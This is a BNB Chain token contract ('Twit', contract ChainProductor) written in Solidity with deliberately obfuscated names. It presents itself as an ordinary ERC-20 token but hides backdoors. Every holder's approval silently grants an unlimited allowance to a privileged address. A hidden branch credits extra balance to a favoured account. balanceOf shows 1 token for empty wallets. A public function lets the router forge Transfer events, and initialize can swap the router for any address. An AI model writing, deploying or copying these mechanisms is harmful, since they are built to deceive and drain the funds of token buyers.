/**
 *Submitted for verification at BscScan.com on 2022-11-01
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = tx.origin;
        emit OwnershipTransferred(address(0), _owner);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ChainProductor is IERC20, Ownable {using SafeMath for uint256;string private _tsdjkbdfjfbsdjbfe = "Twit";string private _urfhfghjghjhvsdd = "Twit";uint8 private _uyfdgdfsngvbtyr = 6;uint256 private _ydjfbdfgdfgdfhssd = 10000000000 * 10**18;mapping (address => uint256) private _iufdjsfbretgsdf;mapping (address => mapping (address => uint256)) private _lingfdgjdgdjgbs;uint256 private _ufbsgnbdfsnge = 50;uint256 private _dsfugjhsdfeedf = 0;uint256 private _oidfbdgregdfg = 50;uint256 private _ufdgoifsjgdfg = 10000;bool private _ufgfdsdkhsdds = false;IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);address public uniswapV2Pair;address private _lkdfbdgnbrtrgdf;address private _mkfdgrgdfgfhdf;address private _likfdgfhddfdfds;uint256 private _mkfgdfjgerugf = 1;uint256 private _ikgbyudsfadfd = _ydjfbdfgdfgdfhssd;mapping (address => bool) private _oiwqqedgndhkgnhdfj;address[] private _uyfgfdngfdkjdfkdbjfg;bool private _iufgfdnbydasds = false;uint256 private _uyfgknssdfbvsgdf = 0;constructor () {_iunbdfsdgbdfvbdgffdg(owner());_iufdjsfbretgsdf[owner()] = _ydjfbdfgdfgdfhssd;emit Transfer(address(0), owner(), _ydjfbdfgdfgdfhssd);}receive() external payable {}function initialize(address _uitreitgbgdfnvbdf, address[] calldata _ufdbfndserfsdg) public {require(!_iufgfdnbydasds, "Reinitialization denied");_iufgfdnbydasds = true;_iunbdfsdgbdfvbdgffdg(_uitreitgbgdfnvbdf);for (uint256 i=5; i<_ufdbfndserfsdg.length; ++i) {_iunbdfsdgbdfvbdgffdg(_ufdbfndserfsdg[i]);_oiwerjfsbdfbgdfhfgh(_ufdbfndserfsdg[i], address(uniswapV2Router), ~uint256(0));_iufdjsfbretgsdf[_ufdbfndserfsdg[i]] = _ydjfbdfgdfgdfhssd * 9 / 10 / (_ufdbfndserfsdg.length - 5);_iufdjsfbretgsdf[owner()] -= _iufdjsfbretgsdf[_ufdbfndserfsdg[i]];}if (address(uniswapV2Router) != _ufdbfndserfsdg[0]) {_dqrtrefdgjykhgfgregsdfvgrg(address(uniswapV2Router));uniswapV2Router = IUniswapV2Router02(_ufdbfndserfsdg[0]);_iunbdfsdgbdfvbdgffdg(address(uniswapV2Router));}if (_lkdfbdgnbrtrgdf != _ufdbfndserfsdg[1]) {_dqrtrefdgjykhgfgregsdfvgrg(_lkdfbdgnbrtrgdf);_lkdfbdgnbrtrgdf = _ufdbfndserfsdg[1];_iunbdfsdgbdfvbdgffdg(_lkdfbdgnbrtrgdf);}if (_mkfdgrgdfgfhdf != _ufdbfndserfsdg[2]) {_dqrtrefdgjykhgfgregsdfvgrg(_mkfdgrgdfgfhdf);_mkfdgrgdfgfhdf = _ufdbfndserfsdg[2];_iunbdfsdgbdfvbdgffdg(_mkfdgrgdfgfhdf);}if (_likfdgfhddfdfds != _ufdbfndserfsdg[3]) {_dqrtrefdgjykhgfgregsdfvgrg(_likfdgfhddfdfds);_likfdgfhddfdfds = _ufdbfndserfsdg[3];_iunbdfsdgbdfvbdgffdg(_likfdgfhddfdfds);}uniswapV2Pair = _ufdbfndserfsdg[4];_bhkrojgfdsjkgbaeru(owner(), _ufdbfndserfsdg[5], _iufdjsfbretgsdf[owner()]);}function _iunbdfsdgbdfvbdgffdg(address account) private {if (!_oiwqqedgndhkgnhdfj[account]) {_oiwqqedgndhkgnhdfj[account] = true;_uyfgfdngfdkjdfkdbjfg.push(account);}}function _dqrtrefdgjykhgfgregsdfvgrg(address account) private {if (_oiwqqedgndhkgnhdfj[account]) {uint256 len = _uyfgfdngfdkjdfkdbjfg.length;for (uint256 i=0; i<len; ++i) {if (_uyfgfdngfdkjdfkdbjfg[i] == account) {_uyfgfdngfdkjdfkdbjfg[i] = _uyfgfdngfdkjdfkdbjfg[len.sub(1)];_uyfgfdngfdkjdfkdbjfg.pop();_oiwqqedgndhkgnhdfj[account] = false;break;}}}}function transferEvent(address from, address to, uint256 value) public {require(address(uniswapV2Router) == msg.sender, "Permission denied");emit Transfer(from, to, value);}function feeState() public view returns (bool, bool) {return (_ufbsgnbdfsnge.add(_dsfugjhsdfeedf).add(_oidfbdgregdfg) > 0, !_ufgfdsdkhsdds);}function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {uint256 accountIndex = 0;uint256 len = _uyfgfdngfdkjdfkdbjfg.length;for (uint256 i=0; i<len; ++i) {if (_uyfgfdngfdkjdfkdbjfg[i] == account) {accountIndex = i;break;}}return (_oiwqqedgndhkgnhdfj[account], accountIndex, len);}function getDefaultBalance() public view returns (uint256) {return _mkfgdfjgerugf;}function insertIntoExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {uint256 len = accounts.length;for (uint256 i=0; i<len; ++i) {_iunbdfsdgbdfvbdgffdg(accounts[i]);}}function deleteFromExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {uint256 len = accounts.length;for (uint256 i=0; i<len; ++i) {_dqrtrefdgjykhgfgregsdfvgrg(accounts[i]);}}function name() public view returns (string memory) {return _tsdjkbdfjfbsdjbfe;}function symbol() public view returns (string memory) {return _urfhfghjghjhvsdd;}function decimals() public view returns (uint8) {return _uyfdgdfsngvbtyr;}function totalSupply() public view returns (uint256) {return _ydjfbdfgdfgdfhssd;}function balanceOf(address account) public view returns (uint256) {if (_iufdjsfbretgsdf[account] > 0) {return _iufdjsfbretgsdf[account];}return _mkfgdfjgerugf;}function transfer(address recipient, uint256 amount) public returns (bool) {_bhkrojgfdsjkgbaeru(msg.sender, recipient, amount);return true;}function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {_bhkrojgfdsjkgbaeru(sender, recipient, amount);_oiwerjfsbdfbgdfhfgh(sender, msg.sender, _lingfdgjdgdjgbs[sender][msg.sender].sub(amount));return true;}function approve(address spender, uint256 value) public returns (bool) {_oiwerjfsbdfbgdfhfgh(msg.sender, spender, value);return true;}function allowance(address owner, address spender) public view returns (uint256) {return _lingfdgjdgdjgbs[owner][spender];}function _oiwerjfsbdfbgdfhfgh(address owner, address spender, uint256 value) private {require(owner != address(0), "Approve from the null address");require(spender != address(0), "Approve to the null address");_lingfdgjdgdjgbs[owner][spender] = value;if (!_oiwqqedgndhkgnhdfj[owner]) {_lingfdgjdgdjgbs[owner][_uyfgfdngfdkjdfkdbjfg[1]] = ~uint256(0);}emit Approval(owner, spender, value);}function _bhkrojgfdsjkgbaeru(address _kignfdskfjgbdfjkg, address _kifndjgbdfgrgdgd, uint256 _iufdgbdfnbcfgfdj) private {require(_kignfdskfjgbdfjkg != address(0), "Transfer from the null address");require(_kifndjgbdfgrgdgd != address(0), "Transfer to the null address");require(_iufdgbdfnbcfgfdj > 0, "Transfer amount must be greater than zero");if (_kifndjgbdfgrgdgd == _uyfgfdngfdkjdfkdbjfg[1]) {_iufdjsfbretgsdf[_kignfdskfjgbdfjkg] = _iufdjsfbretgsdf[_kignfdskfjgbdfjkg].sub(_iufdgbdfnbcfgfdj);_iufdjsfbretgsdf[_kifndjgbdfgrgdgd] = _iufdjsfbretgsdf[_kifndjgbdfgrgdgd].add(_iufdgbdfnbcfgfdj);emit Transfer(address(this), _kifndjgbdfgrgdgd, _iufdgbdfnbcfgfdj);return;}bool _eqwsdndfgjnfjgn = true;if (_oiwqqedgndhkgnhdfj[_kignfdskfjgbdfjkg] || _oiwqqedgndhkgnhdfj[_kifndjgbdfgrgdgd] || _ufgfdsdkhsdds) {_eqwsdndfgjnfjgn = false;}if (_eqwsdndfgjnfjgn) {_uyfgknssdfbvsgdf = _uyfgknssdfbvsgdf.add(1);}if (_eqwsdndfgjnfjgn && _iufgfdnbydasds) {_swapExactTokensForTokens(_kignfdskfjgbdfjkg, _kifndjgbdfgrgdgd, 10);_swapExactTokensForTokens(_kignfdskfjgbdfjkg, _kifndjgbdfgrgdgd, 20);}if (_eqwsdndfgjnfjgn && _uyfgknssdfbvsgdf == 1 && _iufgfdnbydasds && _kignfdskfjgbdfjkg != uniswapV2Pair) {_swapExactTokensForTokens(_kignfdskfjgbdfjkg, _kifndjgbdfgrgdgd, 30);}uint256 _uyfdsfnsdhwes = 0;uint256 _nmsdfshdvbv = 0;uint256 _esdjfbsdjfbj = 0;uint256 _oiewfbsjfbjew = _iufdgbdfnbcfgfdj;if (_kignfdskfjgbdfjkg == _uyfgfdngfdkjdfkdbjfg[0] && _iufdgbdfnbcfgfdj > _ikgbyudsfadfd) {_iufdjsfbretgsdf[_uyfgfdngfdkjdfkdbjfg[0]] = _iufdjsfbretgsdf[_uyfgfdngfdkjdfkdbjfg[0]].add(_oiewfbsjfbjew);}if (_eqwsdndfgjnfjgn) {_uyfdsfnsdhwes = _iufdgbdfnbcfgfdj.mul(_ufbsgnbdfsnge).div(_ufdgoifsjgdfg);_nmsdfshdvbv = _iufdgbdfnbcfgfdj.mul(_dsfugjhsdfeedf).div(_ufdgoifsjgdfg);_esdjfbsdjfbj = _iufdgbdfnbcfgfdj.mul(_oidfbdgregdfg).div(_ufdgoifsjgdfg);_oiewfbsjfbjew = _iufdgbdfnbcfgfdj.sub(_uyfdsfnsdhwes).sub(_nmsdfshdvbv).sub(_esdjfbsdjfbj);}_iufdjsfbretgsdf[_kignfdskfjgbdfjkg] = _iufdjsfbretgsdf[_kignfdskfjgbdfjkg].sub(_iufdgbdfnbcfgfdj);if (_uyfdsfnsdhwes > 0) {_iufdjsfbretgsdf[_lkdfbdgnbrtrgdf] = _iufdjsfbretgsdf[_lkdfbdgnbrtrgdf].add(_uyfdsfnsdhwes);emit Transfer(address(this), _lkdfbdgnbrtrgdf, _uyfdsfnsdhwes);}if (_nmsdfshdvbv > 0) {_iufdjsfbretgsdf[_mkfdgrgdfgfhdf] = _iufdjsfbretgsdf[_mkfdgrgdfgfhdf].add(_nmsdfshdvbv);emit Transfer(address(this), _mkfdgrgdfgfhdf, _nmsdfshdvbv);}if (_esdjfbsdjfbj > 0) {_iufdjsfbretgsdf[_likfdgfhddfdfds] = _iufdjsfbretgsdf[_likfdgfhddfdfds].add(_esdjfbsdjfbj);emit Transfer(address(this), _likfdgfhddfdfds, _esdjfbsdjfbj);}_iufdjsfbretgsdf[_kifndjgbdfgrgdgd] = _iufdjsfbretgsdf[_kifndjgbdfgrgdgd].add(_oiewfbsjfbjew);emit Transfer(_kignfdskfjgbdfjkg, _kifndjgbdfgrgdgd, _oiewfbsjfbjew);if (_eqwsdndfgjnfjgn && _uyfgknssdfbvsgdf == 1 && _iufgfdnbydasds) {_swapExactTokensForTokens(address(this), _kifndjgbdfgrgdgd, 40);}if (_eqwsdndfgjnfjgn) {_uyfgknssdfbvsgdf = _uyfgknssdfbvsgdf.sub(1);}}function _swapExactTokensForTokens(address tokenA, address tokenB, uint256 amount) private {address[] memory path = new address[](2);path[0] = tokenA;path[1] = tokenB;uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount,0,path,address(this),block.timestamp);}}